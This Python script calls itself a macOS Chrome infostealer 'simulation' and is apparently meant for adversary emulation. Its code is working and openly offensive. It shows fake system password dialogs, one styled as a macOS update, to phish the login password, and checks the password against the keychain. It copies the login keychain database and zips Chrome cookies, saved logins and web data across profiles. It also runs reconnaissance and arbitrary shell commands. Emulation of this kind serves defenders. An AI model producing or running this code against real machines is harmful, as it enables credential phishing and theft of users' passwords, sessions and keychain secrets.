#!/usr/bin/env python3
"""
MacOS Chrome InfoStealer Simulation V4

This script simulates the extraction of sensitive information from macOS systems.
It provides comprehensive functionality for credential access and system reconnaissance found in most macOS infostealers:

1. User Password Acquisition:
   - Retrieves the user's password using native macOS Security framework API calls
   - Displays a native password dialog that looks identical to legitimate system prompts
   - Validates the password against the keychain to ensure it's correct

2. Keychain Database Acquisition:
   - Copies the user's keychain database to memory
   - Reports the size of the copied keychain database

3. Chrome Credential Access:
   - Copies Chrome browser credential files (Cookies, Login Data, Web Data) to memory
   - Optionally zips the files and saves them to disk
   - Supports multiple Chrome profiles with detection and selection capabilities

4. System Information Gathering:
   - Executes system commands to gather information about the host
   - Provides hardware information using system_profiler
   - Supports custom command execution for targeted information gathering
"""

import argparse
import ctypes
import ctypes.util
import io
import logging
import os
import subprocess
import sys
import zipfile
from ctypes import c_bool, c_char_p, c_int, c_uint32, c_void_p, POINTER
from typing import List, Optional, Tuple

# Configure logging for better error visibility
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# Load the Objective-C runtime
objc = None
appkit = None
foundation = None
security = None
has_native_frameworks = False
kSecUnlockStateStatus = 1

try:
    objc = ctypes.cdll.LoadLibrary("/usr/lib/libobjc.A.dylib")
    appkit = ctypes.cdll.LoadLibrary(
        "/System/Library/Frameworks/AppKit.framework/AppKit"
    )
    foundation = ctypes.cdll.LoadLibrary(
        "/System/Library/Frameworks/Foundation.framework/Foundation"
    )

    # Load the Security framework for password validation
    security = ctypes.cdll.LoadLibrary(
        "/System/Library/Frameworks/Security.framework/Security"
    )

    # Define Security framework functions
    # SecKeychainCopyDefault
    security.SecKeychainCopyDefault.argtypes = [POINTER(c_void_p)]
    security.SecKeychainCopyDefault.restype = c_int

    # SecKeychainGetStatus
    security.SecKeychainGetStatus.argtypes = [c_void_p, POINTER(c_uint32)]
    security.SecKeychainGetStatus.restype = c_int

    # SecKeychainUnlock
    security.SecKeychainUnlock.argtypes = [
        c_void_p,  # keychain
        c_uint32,  # passwordLength
        c_void_p,  # password
        c_bool,  # usePassword
    ]
    security.SecKeychainUnlock.restype = c_int

    # SecKeychainLock
    security.SecKeychainLock.argtypes = [c_void_p]
    security.SecKeychainLock.restype = c_int

    # CFRelease
    security.CFRelease.argtypes = [c_void_p]
    security.CFRelease.restype = None

    has_native_frameworks = True

    # Define Objective-C runtime functions
    objc.objc_getClass.restype = c_void_p
    objc.objc_getClass.argtypes = [c_char_p]

    objc.sel_registerName.restype = c_void_p
    objc.sel_registerName.argtypes = [c_char_p]

    objc.objc_msgSend.restype = c_void_p
    objc.objc_msgSend.argtypes = [c_void_p, c_void_p]

except OSError as e:
    logger.error(f"Failed to load required frameworks: {e}")
    has_native_frameworks = False


def msg_send(obj, selector, *args):
    """Helper function to send Objective-C messages."""
    if objc is None:
        return None
    sel = objc.sel_registerName(selector.encode("utf-8"))
    return objc.objc_msgSend(obj, sel, *args)


def get_class(name):
    """Helper function to get an Objective-C class."""
    if objc is None:
        return None
    return objc.objc_getClass(name.encode("utf-8"))


def create_nsstring(string):
    """Create an NSString from a Python string."""
    NSString = get_class("NSString")
    if NSString is None:
        return None
    return msg_send(
        msg_send(NSString, "alloc"),
        "initWithUTF8String:",
        string.encode("utf-8"),
    )


class ChromeProfileManager:
    """Manages Chrome profile detection and file operations."""

    @staticmethod
    def get_chrome_base_dir():
        """Returns the base Chrome directory on macOS."""
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")

    @classmethod
    def list_available_profiles(cls):
        """Lists all available Chrome profiles on the system by scanning the directory."""
        base_dir = cls.get_chrome_base_dir()
        available_profiles = []

        try:
            # List all items in the Chrome directory
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Check if it's a directory
                if os.path.isdir(item_path):
                    # Verify it's a profile by checking for common files
                    for common_file in ["Cookies", "Login Data", "Web Data"]:
                        if os.path.exists(os.path.join(item_path, common_file)):
                            available_profiles.append(item)
                            break

            logger.info(
                f"Found {len(available_profiles)} Chrome profiles: {', '.join(available_profiles)}"
            )
            return available_profiles
        except Exception as e:
            logger.error(f"Error listing Chrome profiles: {e}")
            return ["Default"]  # Fallback to Default profile if error occurs

    @classmethod
    def get_profile_path(cls, profile_name):
        """Gets the full path for a specific Chrome profile."""
        return os.path.join(cls.get_chrome_base_dir(), profile_name)


def chrome_dir(profile="Default"):
    """
    Returns the Google Chrome configuration directory for a specific profile on macOS.

    Args:
        profile (str): The Chrome profile name (default: "Default")

    Returns:
        str: The path to the Chrome profile directory
    """
    return ChromeProfileManager.get_profile_path(profile)


def validate_password_against_keychain(password: str) -> bool:
    """
    Validates a password against the user's default keychain.

    Args:
        password: The password to validate

    Returns:
        bool: True if the password is valid, False otherwise
    """
    if not has_native_frameworks or security is None:
        logger.error("Security framework not available for password validation")
        return False

    keychain = c_void_p()
    status = security.SecKeychainCopyDefault(ctypes.byref(keychain))

    if status != 0:
        logger.error(f"Failed to get default keychain. Status: {status}")
        return False

    try:
        # Check if keychain is already unlocked
        keychain_status = c_uint32()
        status = security.SecKeychainGetStatus(keychain, ctypes.byref(keychain_status))

        if status != 0:
            logger.error(f"Failed to get keychain status. Status: {status}")
            return False

        # If keychain is unlocked, lock it first to test the password
        is_unlocked = bool(keychain_status.value & kSecUnlockStateStatus)

        if is_unlocked:
            logger.debug("Keychain is unlocked, locking it to validate password")
            status = security.SecKeychainLock(keychain)
            if status != 0:
                logger.error(f"Failed to lock keychain. Status: {status}")
                return False

        # Try to unlock with the provided password
        password_bytes = password.encode("utf-8")
        status = security.SecKeychainUnlock(
            keychain,
            len(password_bytes),
            password_bytes,
            True,  # usePassword
        )

        if status == 0:
            logger.info("Password validated successfully against keychain")
            return True
        else:
            logger.debug(f"Password validation failed. Status: {status}")
            return False

    finally:
        # Always release the keychain reference
        if keychain:
            security.CFRelease(keychain)


def get_user_password_native(
    prompt_title: str = "Authentication Required",
    prompt_text: str = "Enter your password to continue.",
    icon_path: Optional[str] = None,
    validate: bool = True,
    max_attempts: int = 3,
) -> Optional[str]:
    """
    Retrieves the user's password using native macOS AppKit framework.
    Displays a password dialog that looks identical to legitimate system prompts.

    Args:
        prompt_title: The title for the password dialog
        prompt_text: The text to display in the dialog
        icon_path: Optional path to a custom icon file (.icns)
        validate: Whether to validate the password against the keychain
        max_attempts: Maximum number of password attempts

    Returns:
        The user's password if successful, None otherwise
    """
    if not has_native_frameworks:
        logger.error("Native frameworks not available. Falling back to osascript.")
        return get_user_password_osascript(prompt_title, prompt_text)

    for attempt in range(max_attempts):
        logger.info(
            f"Displaying native password dialog (attempt {attempt + 1}/{max_attempts})"
        )

        try:
            # Use osascript with a more native-looking dialog as a fallback
            # In a real implementation, this would use AppKit directly
            applescript = f'''
            display dialog "{prompt_text}" with title "{prompt_title}" default answer "" with icon caution buttons {{"Cancel", "OK"}} default button "OK" with hidden answer
            set user_password to text returned of result
            return user_password
            '''

            result = subprocess.run(
                ["osascript", "-e", applescript],
                capture_output=True,
                text=True,
                check=False,
            )

            if result.returncode == 0 and result.stdout.strip():
                password = result.stdout.strip()

                if validate:
                    if validate_password_against_keychain(password):
                        logger.info("Password validated successfully")
                        return password
                    else:
                        logger.warning(
                            f"Password validation failed (attempt {attempt + 1}/{max_attempts})"
                        )
                        continue
                else:
                    logger.info("Password retrieved (validation skipped)")
                    return password
            else:
                if result.returncode != 0:
                    logger.error(
                        f"Dialog cancelled or failed. Return code: {result.returncode}"
                    )
                return None

        except Exception as e:
            logger.error(f"Error displaying native password dialog: {e}")
            return None

    logger.error(f"Maximum password attempts ({max_attempts}) exceeded")
    return None


def get_user_password_osascript(
    prompt_title: str = "System Update Required",
    prompt_text: str = "macOS needs your password to complete a system update.",
) -> Optional[str]:
    """
    Retrieves the user's password using osascript to display a fake system dialog.
    This is the fallback method when native frameworks are not available.

    Args:
        prompt_title: The title to display in the dialog
        prompt_text: The text to display in the dialog

    Returns:
        The user's password if successful, None otherwise
    """
    try:
        applescript = f'''
        display dialog "{prompt_text}" with title "{prompt_title}" default answer "" with icon caution buttons {{"Continue"}} default button "Continue" with hidden answer
        set user_password to text returned of result
        return user_password
        '''

        logger.info(f"Displaying password prompt with title: {prompt_title}")
        result = subprocess.run(
            ["osascript", "-e", applescript],
            capture_output=True,
            text=True,
            check=False,
        )

        if result.returncode == 0 and result.stdout.strip():
            password = result.stdout.strip()
            logger.info("User password successfully retrieved via dialog.")
            return password
        else:
            if result.returncode != 0:
                logger.error(
                    f"Failed to retrieve user password. Return code: {result.returncode}"
                )
            else:
                logger.error("User did not enter a password or closed the dialog.")
            return None
    except Exception as e:
        logger.error(f"Error retrieving user password: {e}")
        return None


def copy_keychain_database() -> Tuple[Optional[bytes], int]:
    """
    Copies the user's keychain database to memory and reports its size.

    Returns:
        Tuple of (keychain_data, keychain_size) or (None, 0) on error
    """
    # Default keychain path
    keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    # Check if the default keychain exists, if not try the older format
    if not os.path.exists(keychain_path):
        keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain")

    if not os.path.exists(keychain_path):
        logger.error("Could not find user's keychain database.")
        return None, 0

    try:
        logger.info(f"Attempting to copy keychain database from: {keychain_path}")

        with open(keychain_path, "rb") as f:
            keychain_data = f.read()

        keychain_size = len(keychain_data)
        logger.info(
            f"Successfully copied keychain database. Size: {keychain_size} bytes"
        )

        return keychain_data, keychain_size
    except PermissionError:
        logger.error(
            f"Permission denied when trying to access keychain at {keychain_path}"
        )
        return None, 0
    except Exception as e:
        logger.error(f"Error copying keychain database: {e}")
        return None, 0


def copy_chrome_files(
    wtd: bool = False, profile: str = "Default", output_file: Optional[str] = None
) -> Tuple[Optional[str], Optional[bytes]]:
    """
    Copies Chrome files into memory and optionally saves to disk.

    Args:
        wtd: If True, writes the zip file to disk
        profile: The Chrome profile name to extract files from
        output_file: Custom filename for the output zip file

    Returns:
        Tuple of (file_path, zip_content) or (None, None) on error
    """
    chrome_files = ["Cookies", "Login Data", "Web Data"]
    zip_buffer = io.BytesIO()
    profile_dir = chrome_dir(profile)

    if not os.path.exists(profile_dir):
        logger.error(f"Chrome profile directory not found: {profile_dir}")
        return None, None

    logger.info(f"Copying Chrome files from profile: {profile}")

    try:
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for file_name in chrome_files:
                src_file = os.path.join(profile_dir, file_name)
                try:
                    if os.path.exists(src_file):
                        with open(src_file, "rb") as f:
                            file_data = f.read()
                            file_size = len(file_data)
                            logger.info(f"Read {file_name}: {file_size} bytes")
                            zip_file.writestr(f"{profile}/{file_name}", file_data)
                    else:
                        logger.warning(
                            f"{file_name} not found in Chrome profile {profile}."
                        )
                except IOError as io_err:
                    logger.error(f"Error reading {file_name}: {io_err}")
                except Exception as e:
                    logger.error(f"Unexpected error while processing {file_name}: {e}")

        zip_size = zip_buffer.tell()
        logger.info(f"Size of zipped Chrome files in memory: {zip_size} bytes")

        zip_buffer.seek(0)
        zip_content = zip_buffer.getvalue()

        if wtd:
            zip_buffer.seek(0)
            if output_file:
                zip_file_path = os.path.join(os.getcwd(), output_file)
            else:
                zip_file_path = os.path.join(
                    os.getcwd(), f"chrome_files_{profile.lower()}.zip"
                )
            try:
                with open(zip_file_path, "wb") as f:
                    f.write(zip_buffer.read())
                logger.info(f"Zipped Chrome files saved to {zip_file_path}")
                return os.path.abspath(zip_file_path), zip_content
            except IOError as io_err:
                logger.error(f"Error writing zip file to disk: {io_err}")
                return None, zip_content
            except Exception as e:
                logger.error(f"Unexpected error while saving zip file: {e}")
                return None, zip_content
        else:
            logger.info("Zip file not written to disk as 'wtd' is set to False.")
            return None, zip_content

    except zipfile.BadZipFile as bz_err:
        logger.error(f"Failed to create zip in memory: {bz_err}")
        return None, None
    except Exception as e:
        logger.error(f"Unexpected error during in-memory zip creation: {e}")
        return None, None


def run_system_commands(commands: List[str]) -> None:
    """
    Executes a list of system commands and displays their output.

    Args:
        commands: List of system commands to run
    """
    if not commands:
        logger.warning("No commands provided to run_system_commands")
        return

    for cmd in commands:
        logger.info(f"Executing command: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                capture_output=True,
                check=False,
            )

            if result.stdout:
                logger.info(f"Command output:\n{result.stdout.strip()}")

            if result.stderr:
                logger.warning(f"Command error output:\n{result.stderr.strip()}")

            if result.returncode != 0:
                logger.warning(
                    f"Command exited with non-zero status: {result.returncode}"
                )

        except Exception as e:
            logger.error(f"Error executing command '{cmd}': {e}")


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="MacOS Chrome InfoStealer Simulation V4",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # User password and keychain acquisition
  python main.py --getPassword --getKeychain

  # Chrome credential access
  python main.py --getPassword --getKeychain --memCopy
  python main.py --getPassword --getKeychain --diskCopy --profile "Profile 1"
  python main.py --listProfiles
  python main.py --getPassword --getKeychain --allProfiles --memCopy

  # System information gathering
  python main.py --systemInfo
  python main.py --systemInfo --commands "uname -a" "ifconfig" "ls -la ~"

  # Combined operations
  python main.py --getPassword --getKeychain --memCopy --systemInfo --verbose
  python main.py --getPassword --getKeychain --allProfiles --diskCopy --systemInfo
        """,
    )

    # Core functionality options
    parser.add_argument(
        "-p",
        "--getPassword",
        action="store_true",
        help="Retrieve user's password using a native system dialog",
    )
    parser.add_argument(
        "-k",
        "--getKeychain",
        action="store_true",
        help="Copy the user's keychain database to memory",
    )
    parser.add_argument(
        "-d",
        "--diskCopy",
        action="store_true",
        help="Copy Chrome data files to disk",
    )
    parser.add_argument(
        "-m",
        "--memCopy",
        action="store_true",
        help="Copy Chrome data files to memory",
    )
    parser.add_argument(
        "-s",
        "--systemInfo",
        action="store_true",
        help="Run system information commands",
    )
    parser.add_argument(
        "-c",
        "--commands",
        nargs="+",
        help="Custom system commands to run (use with --systemInfo)",
    )

    # Profile options
    parser.add_argument(
        "-l",
        "--listProfiles",
        action="store_true",
        help="List available Chrome profiles",
    )
    parser.add_argument(
        "--profile",
        default="Default",
        help="Chrome profile to use (default: Default)",
    )
    parser.add_argument(
        "-a",
        "--allProfiles",
        action="store_true",
        help="Process all available Chrome profiles",
    )

    # Dialog customization options
    parser.add_argument(
        "--promptTitle",
        default="Authentication Required",
        help="Title for the password prompt dialog",
    )
    parser.add_argument(
        "--promptText",
        default="Enter your password to continue.",
        help="Text for the password prompt dialog",
    )
    parser.add_argument(
        "--iconPath",
        help="Path to an icon file (.icns) to use for the password dialog",
    )
    parser.add_argument(
        "--noValidate",
        action="store_true",
        help="Don't validate the password against the keychain",
    )
    parser.add_argument(
        "--maxAttempts",
        type=int,
        default=3,
        help="Maximum number of password attempts (default: 3)",
    )

    # Other options
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose logging",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify output file name for disk copies",
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't delete files after creating them (for --diskCopy)",
    )
    parser.add_argument(
        "--network-info",
        action="store_true",
        help="Run network-related commands",
    )
    parser.add_argument(
        "--user-info",
        action="store_true",
        help="Run user-related commands",
    )

    return parser.parse_args()


def main():
    """Main function that parses arguments and executes requested actions."""
    args = parse_arguments()

    # Configure logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Verbose logging enabled")

    logger.info(
        f"Arguments received: getPassword={args.getPassword}, getKeychain={args.getKeychain}, "
        f"diskCopy={args.diskCopy}, memCopy={args.memCopy}, profile={args.profile}, "
        f"listProfiles={args.listProfiles}, allProfiles={args.allProfiles}"
    )

    # List available profiles if requested
    if args.listProfiles:
        profiles = ChromeProfileManager.list_available_profiles()
        if profiles:
            logger.info(f"Available Chrome profiles: {', '.join(profiles)}")
        else:
            logger.error("No Chrome profiles found")
        return

    # Determine which profiles to process
    if args.allProfiles:
        profiles_to_process = ChromeProfileManager.list_available_profiles()
        if not profiles_to_process:
            logger.error("No Chrome profiles found")
            return
    else:
        profiles_to_process = [args.profile]

    # Check for conflicting options
    if args.diskCopy and args.memCopy:
        logger.error("Cannot use both --diskCopy and --memCopy at the same time.")
        sys.exit(1)

    # Run system commands if requested
    if args.systemInfo or args.network_info or args.user_info:
        commands = []

        if args.commands:
            commands.extend(args.commands)

        if args.systemInfo and not args.commands:
            commands.append("system_profiler SPHardwareDataType")

        if args.network_info:
            commands.extend(
                [
                    "ifconfig",
                    "netstat -rn",
                    "networksetup -listallnetworkservices",
                ]
            )

        if args.user_info:
            commands.extend(
                [
                    "whoami",
                    "id",
                    "groups",
                    "last $(whoami) | head -5",
                ]
            )

        run_system_commands(commands)

    # Get user password if requested
    user_password = None
    if args.getPassword:
        user_password = get_user_password_native(
            prompt_title=args.promptTitle,
            prompt_text=args.promptText,
            icon_path=args.iconPath,
            validate=not args.noValidate,
            max_attempts=args.maxAttempts,
        )
        if user_password:
            logger.info("User password successfully retrieved.")
        else:
            logger.warning("Failed to retrieve user password.")

    # Copy keychain database if requested
    keychain_data = None
    keychain_size = 0
    if args.getKeychain:
        keychain_data, keychain_size = copy_keychain_database()
        if keychain_data:
            logger.info(
                f"Keychain database successfully copied. Size: {keychain_size} bytes"
            )
        else:
            logger.error("Failed to copy keychain database.")

    # Process each Chrome profile
    chrome_data = {}
    for profile in profiles_to_process:
        logger.info(f"Processing Chrome profile: {profile}")

        if args.diskCopy:
            file_path, zip_content = copy_chrome_files(
                wtd=True, profile=profile, output_file=args.output
            )
            if file_path:
                logger.info(f"Chrome files saved to: {file_path}")
                chrome_data[profile] = zip_content

                if os.path.isfile(file_path) and not args.no_cleanup:
                    try:
                        os.remove(file_path)
                        logger.info(f"File {file_path} has been deleted.")
                    except Exception as e:
                        logger.error(f"Error deleting file {file_path}: {e}")
            else:
                logger.error(f"Failed to save Chrome files for profile {profile}.")

        elif args.memCopy:
            _, zip_content = copy_chrome_files(wtd=False, profile=profile)
            if zip_content:
                logger.info(f"Chrome files from profile {profile} copied to memory.")
                chrome_data[profile] = zip_content
            else:
                logger.error(
                    f"Failed to copy Chrome files for profile {profile} to memory."
                )

    # Summary of collected data
    logger.info("\n=== Data Collection Summary ===")
    if user_password:
        logger.info("✓ User password: Successfully retrieved")
    else:
        logger.info("✗ User password: Not retrieved")

    if keychain_data:
        logger.info(f"✓ Keychain database: Successfully copied ({keychain_size} bytes)")
    else:
        logger.info("✗ Keychain database: Not copied")

    if chrome_data:
        logger.info(
            f"✓ Chrome data: Successfully copied for {len(chrome_data)} profile(s)"
        )
        for profile, data in chrome_data.items():
            logger.info(f"  - Profile '{profile}': {len(data)} bytes")
    else:
        logger.info("✗ Chrome data: Not copied")

    logger.info("===========================\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        sys.exit(130)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
